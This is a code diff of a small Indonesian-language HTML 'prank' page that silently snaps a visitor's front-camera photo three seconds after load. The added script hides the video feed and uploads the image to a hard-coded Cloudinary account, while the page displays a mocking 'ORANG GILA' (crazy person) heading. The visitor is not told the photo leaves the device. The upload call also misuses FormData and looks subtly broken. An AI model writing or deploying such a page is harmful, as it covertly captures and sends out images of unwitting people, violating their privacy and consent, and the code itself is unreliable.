@@ -3,59 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prank Kamera</title>
+    <title>Kamera Otomatis</title>
     <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: white;
-        }
-        h1 {
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        canvas {
-            border: 5px solid black;
-            max-width: 90vw;
-            max-height: 70vh;
-        }
-        video { display: none; } /* Sembunyikan video */
+        body { text-align: center; font-family: Arial, sans-serif; }
+        #preview { margin-top: 20px; border: 2px solid black; }
     </style>
 </head>
 <body>
-    <h1>ORANG HILANG :</h1>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <h1>ORANG GILA :</h1>
+    <video id="camera" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <img id="preview" alt="Foto akan muncul di sini">
 
     <script>
-        const video = document.getElementById('video');
+        const video = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
+        const preview = document.getElementById('preview');
         const ctx = canvas.getContext('2d');
 
+        // **1. Aktifkan Kamera Depan**
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    video.style.display = "none";
-                    canvas.style.display = "block";
-                    stream.getTracks().forEach(track => track.stop());
-                };
-            })
-            .catch(err => {
-                console.error("Gagal mengakses kamera:", err);
-            });
-    </script>
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => console.error("Akses kamera ditolak!", err));
 
-<script src="https://static.app/js/static.js" type="text/javascript"></script>
+        // **2. Ambil Foto Otomatis Setelah 3 Detik**
+        setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            preview.src = canvas.toDataURL("image/png");
+
+            // **3. Upload ke Cloudinary**
+            uploadToCloudinary(canvas.toDataURL("image/png"));
+        }, 3000);
+
+        // **4. Fungsi Upload ke Cloudinary**
+        function uploadToCloudinary(imageData) {
+            let cloudName = "dl5dswv7q";  // Ganti dengan Cloud Name kamu
+            let uploadPreset = "tikontol";  // Ganti dengan Upload Preset kamu
+
+            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                method: "POST",
+                body: new FormData(Object.assign(new FormData(), {
+                    file: imageData,
+                    upload_preset: uploadPreset
+                }))
+            })
+            .then(res => res.json())
+            .then(data => console.log("Foto tersimpan di:", data.secure_url))
+            .catch(err => console.error("Gagal upload!", err));
+        }
+    </script>
 </body>
 </html>
